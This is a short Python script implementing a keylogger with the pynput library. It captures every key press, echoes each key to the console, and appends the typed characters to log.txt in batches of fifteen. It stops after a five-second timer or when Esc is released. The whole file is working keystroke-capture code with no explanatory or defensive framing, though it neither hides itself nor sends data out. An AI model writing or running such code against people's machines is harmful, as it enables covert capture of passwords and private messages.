import threading
from pynput.keyboard import Key, Listener

class Keylogger:
    def __init__(self):
        self.count = 0
        self.keys = []
        self.timer = threading.Timer(5, self.stop_keylogger)
        self.listener = None

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1
        print("{0} pressed".format(key))
        if self.count >= 15:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def write_file(self, keys):
        with open("log.txt", "a") as log:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    log.write('\n')
                elif k.find("Key") == -1:
                    log.write(k)

    def on_release(self, key):
        if key == Key.esc:
            self.timer.cancel()
            return False

    def stop_keylogger(self):
        self.listener.stop()

    def keylogger(self):
        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
        self.timer.start()
        self.listener.start()
        self.listener.join()

k = Keylogger()
k.keylogger()